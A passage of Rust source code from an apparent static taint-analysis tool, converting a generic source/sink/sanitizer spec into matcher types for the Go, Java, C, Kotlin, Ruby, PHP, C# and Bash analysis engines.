        GenericMatcher::ParamName { names, description } => go_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => go_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => go_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            go_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => go_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => go_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => go_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the Go engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            go_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => go_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            go_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => go_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => go_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => go_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            go_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => go_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => go_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            go_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => go_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            go_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => go_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => go_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => go_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => go_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => go_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => go_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => go_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Java taint spec.
fn to_java_spec(g: &GenericSpec) -> java_taint::TaintSpec {
    java_taint::TaintSpec {
        sources: g.sources.iter().map(to_java_matcher).collect(),
        sinks: g.sinks.iter().map(to_java_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_java_matcher).collect(),
    }
}

fn to_java_matcher(m: &GenericMatcher) -> java_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => java_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => java_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => java_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => java_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => java_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            java_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => java_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => java_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => java_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the Java engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            java_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => java_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            java_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => java_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => java_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => java_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            java_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => java_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => java_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            java_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => java_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            java_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => java_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => java_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => java_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => java_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => java_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => java_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => java_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a C taint spec.
fn to_c_spec(g: &GenericSpec) -> c_taint::TaintSpec {
    c_taint::TaintSpec {
        sources: g.sources.iter().map(to_c_matcher).collect(),
        sinks: g.sinks.iter().map(to_c_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_c_matcher).collect(),
    }
}

fn to_c_matcher(m: &GenericMatcher) -> c_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => c_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => c_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => c_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        // C has no OOP method calls; include the matcher for spec completeness but
        // the C engine only recognises `NodeMatcher::Call`, so it will never fire.
        GenericMatcher::MethodName {
            method,
            description,
        } => c_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => c_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            c_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        // ReceiverCall (`os.$METHOD(...)`) has no meaning in plain C; carried
        // in the spec but the C engine no-ops it.
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => c_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        // FieldName (property read) is not meaningful in plain C; carried in
        // the spec for completeness but the C engine no-ops it (like
        // MemberAssign below).
        GenericMatcher::FieldName { field, description } => c_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        // Subscript (index access) is not meaningful in plain C taint flow;
        // carried in the spec but the C engine no-ops it.
        GenericMatcher::Subscript { base, description } => c_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the C engine ignores it.
        GenericMatcher::MemberAssign { field, description } => c_taint::NodeMatcher::MemberAssign {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::BinopFormat { description } => c_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            c_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => c_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => c_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => c_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            c_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => c_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => c_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            c_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => c_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            c_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => c_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => c_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => c_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => c_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => c_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => c_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => c_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Kotlin taint spec.
fn to_kotlin_spec(g: &GenericSpec) -> kotlin_taint::TaintSpec {
    kotlin_taint::TaintSpec {
        sources: g.sources.iter().map(to_kotlin_matcher).collect(),
        sinks: g.sinks.iter().map(to_kotlin_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_kotlin_matcher).collect(),
    }
}

fn to_kotlin_matcher(m: &GenericMatcher) -> kotlin_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => kotlin_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => kotlin_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => kotlin_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => kotlin_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => kotlin_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            kotlin_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => kotlin_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => kotlin_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => kotlin_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the Kotlin engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            kotlin_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => kotlin_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            kotlin_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => kotlin_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => kotlin_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => kotlin_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            kotlin_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => kotlin_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => kotlin_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            kotlin_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => kotlin_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            kotlin_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => kotlin_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => kotlin_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => kotlin_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => kotlin_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => kotlin_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => kotlin_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => kotlin_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Ruby taint spec.
fn to_ruby_spec(g: &GenericSpec) -> ruby_taint::TaintSpec {
    ruby_taint::TaintSpec {
        sources: g.sources.iter().map(to_ruby_matcher).collect(),
        sinks: g.sinks.iter().map(to_ruby_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_ruby_matcher).collect(),
    }
}

fn to_ruby_matcher(m: &GenericMatcher) -> ruby_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => ruby_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => ruby_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => ruby_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => ruby_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => ruby_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            ruby_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => ruby_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => ruby_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => ruby_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the Ruby engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            ruby_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => ruby_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            ruby_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => ruby_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => ruby_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => ruby_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            ruby_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => ruby_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => ruby_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            ruby_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => ruby_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            ruby_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => ruby_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => ruby_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => ruby_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => ruby_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => ruby_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => ruby_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => ruby_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a PHP taint spec.
fn to_php_spec(g: &GenericSpec) -> php_taint::TaintSpec {
    php_taint::TaintSpec {
        sources: g.sources.iter().map(to_php_matcher).collect(),
        sinks: g.sinks.iter().map(to_php_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_php_matcher).collect(),
    }
}

/// Convert the generic spec into a C# taint spec.
fn to_csharp_spec(g: &GenericSpec) -> csharp_taint::TaintSpec {
    csharp_taint::TaintSpec {
        sources: g.sources.iter().map(to_csharp_matcher).collect(),
        sinks: g.sinks.iter().map(to_csharp_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_csharp_matcher).collect(),
    }
}

fn to_csharp_matcher(m: &GenericMatcher) -> csharp_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => csharp_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => csharp_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => csharp_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => csharp_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => csharp_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            csharp_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => csharp_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => csharp_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => csharp_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the C# engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            csharp_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => csharp_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            csharp_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => csharp_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => csharp_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => csharp_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            csharp_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => csharp_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => csharp_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            csharp_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => csharp_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            csharp_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => csharp_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => csharp_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => csharp_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => csharp_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => csharp_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => csharp_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => csharp_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Bash taint spec.
fn to_bash_spec(g: &GenericSpec) -> bash_taint::TaintSpec {
    bash_taint::TaintSpec {
        sources: g.sources.iter().map(to_bash_matcher).collect(),
        sinks: g.sinks.iter().map(to_bash_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_bash_matcher).collect(),
    }
}

fn to_bash_matcher(m: &GenericMatcher) -> bash_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => bash_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => bash_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => bash_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
